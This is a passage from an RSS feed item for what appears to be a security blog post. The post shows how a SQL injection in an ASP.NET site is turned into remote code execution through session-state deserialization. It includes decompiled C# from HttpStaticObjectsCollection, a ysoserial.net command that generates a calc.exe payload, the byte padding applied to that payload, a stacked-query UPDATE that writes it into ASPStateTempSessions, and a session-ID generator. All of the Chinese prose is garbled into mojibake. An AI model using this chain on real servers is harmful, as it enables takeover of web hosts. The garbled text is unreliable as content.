        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•ÁúãÂà∞ÂØ¶Èöõ‰∏ä DeserializeStoreData ÂèàÊòØÊääÂèçÂ∫èÂàóÂåñÈÅéÁ®ãËΩâ‰∫§Áµ¶ÂÖ∂‰ªñÈ°ûÂà•ÔºåËÄå‰æùÊìöÂèñÂá∫ÁöÑË≥áÊñô‰∏çÂêåÔºåÂèØËÉΩÊúÉËΩâ‰∫§Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SessionStateItemCollection.Deserialize&lt;/code&gt; Êàñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpStaticObjectsCollection.Deserialize&lt;/code&gt; ÂÅöËôïÁêÜÔºåÂú®ËßÄÂØüÁ®ãÂºèÁ¢ºÂæåÁôºÁèæ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpStaticObjectsCollection&lt;/code&gt; ÁöÑËôïÁêÜÁõ∏Â∞çÂñÆÁ¥îÔºåÊâÄ‰ª•ÊàëÂÄã‰∫∫Â∞±ÈÅ∏ÊìáÂæÄÈÄôÂÄãÂàÜÊîØ‰∏ãÂéªÁ†îÁ©∂„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sealed&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ICollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;typename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AltSerialization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadValueFromStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// skipped&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ë∑üÈÄ≤Âéª‰∏ÄÁúãÔºåÁôºÁèæ HttpStaticObjectsCollection ÂèñÂá∫‰∏Ä‰∫õ bytes ‰πãÂæåÔºåÂèàÊääÈÅéÁ®ãËΩâ‰∫§Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AltSerialization.ReadValueFromStream&lt;/code&gt; ÈÄ≤Ë°åËôïÁêÜÔºåÁúãÂà∞ÈÄôÁöÑÊúãÂèãÂÄëÊàñË®±ÊúÉËáâ‰∏ä‰∏âÊ¢ùÁ∑öÂú∞ÂøÉÊÉ≥Ôºö„ÄåË©≤‰∏çÊúÉÂèàË¶ÅËøΩÈÄ≤ÂéªÂêß . . „ÄçÔºå‰∏çÈÅéÂÖ∂ÂØ¶Âà∞Ê≠§ÁÇ∫Ê≠¢Â∞±Â∑≤Ë∂≥Â§†ÔºåÂõ†ÁÇ∫ AltSerialization ÂØ¶Èöõ‰∏äÈ°û‰ººÊñº BinaryFormatter ÁöÑÂåÖË£ùÔºåÂà∞Ê≠§Â∑≤Á∂ìÊúâË∂≥Â§†Ë≥áË®ä‰ΩúÂà©Áî®ÔºåÂè¶Â§ñÈÇÑÊúâ‰∏ÄÂÄãÂéüÂõ†ÂÖºÂ•ΩÊ∂àÊÅØÔºåÁï∂ÂàùÊàëÁ®ãÂºèÁ¢ºËøΩÂà∞Ê≠§ËôïÊôÇÔºå‰∏äÁ∂≤‰∏ÄÊü•ÈÄôÂÄãÁâ©‰ª∂ÔºåÁôºÁèæ &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; Â∑≤Á∂ìÊúâÂª∫Á´ã AltSerialization ÂèçÂ∫èÂàóÂåñ payload ÁöÑ pluginÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÊéèÂá∫ÈÄôÂÄãÂà©Âô®‰æÜ‰ΩøÁî®ÔºÅ‰∏ãÈù¢‰∏ÄË°åÊåá‰ª§Â∞±ÂèØ‰ª•Áî¢ÁîüÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§ calc.exe ÁöÑ base64 Á∑®Á¢ºÂæåÁöÑ payload„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Altserialization &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; HttpStaticObjectsCollection &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;calc.exe&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰∏çÈÅéÂà∞Ê≠§ÈÇÑÊòØÊúâÂÄãÂ∞èÂïèÈ°åÈúÄË¶ÅËß£Ê±∫Ôºåysoserial.net ÁöÑ AltSerialization plugin ÊâÄÂª∫Á´ãÁöÑ payload ÊòØÊîªÊìä SessionStateItemCollection Êàñ HttpStaticObjectsCollection ÂÖ©ÂÄãÈ°ûÂà•ÁöÑÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåËÄåÊàëÂÄëÂÑ≤Â≠òÂú®Ë≥áÊñôÂ∫´‰∏≠ÁöÑ session Â∫èÂàóÂåñË≥áÊñôÊòØÁî±Âú®Ê≠§‰πã‰∏äÈÇÑÈ°çÂ§ñ‰Ωú‰∫Ü‰∏ÄÂ±§ÂåÖË£ùÁöÑ SessionStateUtility È°ûÂà•ËôïÁêÜÁöÑÔºåÊâÄ‰ª•ÂøÖÈ†àË¶ÅÂÜçÂÅöÈªû‰øÆÈ£æ„ÄÇÂõûÈ†≠ÂÜçÂéªÁúãÁúãÁ®ãÂºèÁ¢ºÔºåÊúÉÁôºÁèæ SessionStateUtility ‰πüÂè™Ê∑ªÂä†‰∫ÜÂπæÂÄã bytesÔºåÊ∏õÂåñÂæåÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â∞çÊñº Int32 Ë¶ÅÊ∑ªÂä† 4 ÂÄã bytesÔºåBoolean ÂâáÊòØ 1 ÂÄã byteÔºåËÄåÂõ†ÁÇ∫Ë¶ÅËÆìÁ®ãÂºèË∑ØÂæëËÉΩÈÄ≤ÂÖ• HttpStaticObjectsCollection ÁöÑÂàÜÊîØÔºåÂøÖÈ†àËÆìÁ¨¨ 6 ÂÄã byte ÁÇ∫ 1 ÊâçËÉΩËÆìÊ¢ù‰ª∂ÈÅîÊàêÔºåÂÖàÂ∞áÂéüÊú¨Âæû ysoserial.net Áî¢Âá∫ÁöÑ payload Âæû base64 ËΩâÊàê hex Ë°®Á§∫ÔºåÂÜçÂâçÂæåÂêÑÂà•Ê∑ªÂä† 6„ÄÅ1 bytesÔºåÂ¶Ç‰∏ãÁ§∫ÊÑèÂúñÔºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  timeout    false  true            HttpStaticObjectsCollection             eof
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îê     ‚îå‚îê    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îê
00 00 00 00  00     01    010000000001140001000000fff ... Áï• ... 0000000a0b ff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰øÆÈ£æÂÆåÁöÑÈÄôÂÄã payload Â∞±ËÉΩÁî®‰æÜÊîªÊìä SessionStateUtility È°ûÂà•‰∫ÜÔºÅ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÁöÑÊ≠•È©üÂ∞±ÊòØÂà©Áî®ÈñãÈ†≠ÁöÑ SQL Injection Â∞áÊÉ°ÊÑèÁöÑÂ∫èÂàóÂåñÂÖßÂÆπÊ≥®ÂÖ•ÈÄ≤ÂéªË≥áÊñôÂ∫´ÔºåÂ¶ÇÊûúÊ≠£Â∏∏ÁÄèË¶ΩÁõÆÊ®ôÁ∂≤Á´ôÊôÇÊúâÂá∫Áèæ ASP.NET_SessionId ÁöÑ Cookie Â∞±‰ª£Ë°®Â∑≤Á∂ìÊúâ‰∏ÄÁ≠ÜÂ∞çÊáâÁöÑ Session Ë®òÈåÑÂÑ≤Â≠òÂú®Ë≥áÊñôÂ∫´Ë£°ÔºåÊâÄ‰ª•ÊàëÂÄëÂè™ÈúÄË¶ÅÂü∑Ë°åÂ¶Ç‰∏ãÁöÑ SQL Update Ë™ûÂè•Ôºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?id=1; UPDATE ASPState.dbo.ASPStateTempSessions
       SET SessionItemShort = 0x{Hex_Encoded_Payload}
       WHERE SessionId LIKE &apos;{ASP.NET_SessionId}%25&apos;; --
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂàÜÂà•Â∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{ASP.NET_SessionId}&lt;/code&gt; ÊõøÊèõÊàêËá™Â∑±ÁöÑ ASP.NET_SessionId ÁöÑ Cookie ÂÄº‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{Hex_Encoded_Payload}&lt;/code&gt; ÊõøÊèõÊàêÂâçÈù¢Ê∫ñÂÇôÂ•ΩÁöÑÂ∫èÂàóÂåñ payload Âç≥ÂèØ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÇ£ÂÅáÂ¶ÇÊ≤íÊúâ ASP.NET_SessionId ÊÄéÈ∫ºËæ¶ÔºüÈÄôË°®Á§∫ÁõÆÊ®ôÂèØËÉΩÈÇÑÊú™ÂÑ≤Â≠ò‰ªª‰ΩïË≥áÊñôÂú® Session ‰πã‰∏≠ÔºåÊâÄ‰ª•‰πüÂ∞±‰∏çÊúÉÁî¢Áîü‰ªª‰ΩïË®òÈåÑÂú®Ë≥áÊñôÂ∫´Ë£°Ôºå‰ΩÜÊó¢ÁÑ∂Ê≤íÊúâÁöÑË©±ÔºåÈÇ£ÊàëÂÄëÂ∞±Á°¨Â°û‰∏ÄÂÄã Cookie Áµ¶ÂÆÉÔºÅASP.NET ÁöÑ SessionId ÊòØÈÄèÈÅé‰∫ÇÊï∏Áî¢ÁîüÁöÑ 24 ÂÄãÂ≠óÂÖÉÔºå‰ΩÜ‰ΩøÁî®‰∫ÜÂÆ¢Ë£ΩÂåñÁöÑÂ≠óÂÖÉÈõÜÔºåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®‰ª•‰∏ãÁöÑ Python script Áî¢Áîü‰∏ÄÁµÑ SessionIdÔºå‰æãÂ¶ÇÔºöplxtfpabykouhu3grwv1j1qwÔºå‰πãÂæåÂ∏∂‰∏ä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie: ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; ÁÄèË¶Ω‰ªª‰∏ÄÂÄã aspx È†ÅÈù¢ÔºåÁêÜË´ñ‰∏ä ASP.NET Â∞±ÊúÉËá™ÂãïÂú®Ë≥áÊñôÂ∫´Ë£°Ê∑ªÂä†‰∏ÄÁ≠ÜË®òÈåÑ„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;abcdefghijklmnopqrstuvwxyz012345&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂÅáÂ¶ÇÂú®Ë≥áÊñôÂ∫´Ë£°‰ªçÁÑ∂Ê≤íÊúâ‰ªª‰ΩïË®òÈåÑÂá∫ÁèæÔºåÈÇ£Â∞±Âè™ËÉΩÊâãÂãïÂàª INSERT ÁöÑ SQL ‰æÜÂâµÈÄ†‰∏ÄÂÄãË®òÈåÑÔºåËá≥ÊñºÂ¶Ç‰ΩïÂàªÂá∫ÈÄôÈÉ®ÂàÜÔºüÂè™Ë¶ÅÁúãÁúãÁ®ãÂºèÁ¢ºÊáâË©≤Â∞±ÂèØ‰ª•ÂæàÂÆπÊòìÊßãÈÄ†Âá∫‰æÜÔºåÊâÄ‰ª•ÁïôÁµ¶Â§ßÂÆ∂Ëá™Ë°åÂéªÁé© :P&lt;/p&gt;

&lt;p&gt;Á≠âÂà∞ Payload È†ÜÂà©Ê≥®ÂÖ•ÂæåÔºåÂè™Ë¶ÅÂÜçÊ¨°Áî®ÈÄôÂÄã Cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; ÁÄèË¶Ω‰ªª‰Ωï‰∏ÄÂÄã aspx È†ÅÈù¢ÔºåÂ∞±ÊúÉËß∏ÁôºÂèçÂ∫èÂàóÂåñÂü∑Ë°å‰ªªÊÑèÁ≥ªÁµ±Êåá‰ª§ÔºÅ&lt;/p&gt;

&lt;p&gt;È°åÂ§ñË©±ÔºåÂà©Áî® SessionState ÁöÑÂèçÂ∫èÂàóÂåñÂèñÂæó ASP.NET Á∂≤Á´ôÊáâÁî®Á®ãÂºè‰∏ªÊ©üÊéßÂà∂Ê¨äÁöÑÂ†¥ÊôØ‰∏¶‰∏çÂÉÖÈôêÊñº SQL Injection„ÄÇÂú®ÂÖßÁ∂≤Êª≤ÈÄèÊ∏¨Ë©¶ÁöÑÈÅéÁ®ã‰∏≠ÔºåÁ∂ìÂ∏∏ÊúÉÈÅáÂà∞ÁöÑÊÉÖÂ¢ÉÊòØÔºåÊàëÂÄëÈÄèÈÅéÂêÑÊñπÁöÑË≥áË®äÊ¥©Êºè ( ‰æãÂ¶ÇÔºöÂÖßÈÉ® GitLab„ÄÅ‰ªªÊÑèËÆÄÊ™îÁ≠â ) ÂèñÂæóË®±Â§ö SQL Server ÁöÑÂ∏≥Ëôü„ÄÅÂØÜÁ¢ºÔºå‰ΩÜÂîØÁç®ÂèñÂæó‰∏ç‰∫ÜÁõÆÊ®ô ASP.NET Á∂≤Á´ôÊáâÁî®Á®ãÂºèÁöÑ Windows ‰∏ªÊ©üÁöÑÂ∏≥ËôüÂØÜÁ¢ºÔºåËÄåÁÇ∫‰∫ÜÈÅîÊàêÁõÆÊ®ô ( ÊéßÂà∂ÊåáÂÆöÁöÑÁ∂≤Á´ô‰∏ªÊ©ü )ÔºåÊàëÂÄëÂ∞±ÊõæÁ∂ì‰ΩøÁî®ÈÅéÈÄôÂÄãÊñπÂºèÂèñÂæóÁõÆÊ®ôÁöÑÊéßÂà∂Ê¨äÔºåÊâÄ‰ª•‰ΩúÁÇ∫ÂÖßÁ∂≤Ê©´ÂêëÁßªÂãïÁöÑÊâãÊÆµ‰πüÊòØÁ®çÂæÆÊúâÂÉπÂÄº‰∏îÈùûÂ∏∏ÊúâË∂£„ÄÇËá≥ÊñºÈÇÑËÉΩÊúâ‰ªÄÈ∫ºÊ®£ÁöÑËä±Ê®£ËàáÁé©Ê≥ïÔºåÂ∞±Ë¶ÅÈù†ÂêÑ‰ΩçÊåÅÁ∫åÂú∞ÁôºÊèÆÊÉ≥ÂÉèÂäõÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/</link>
                <guid>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate</guid>
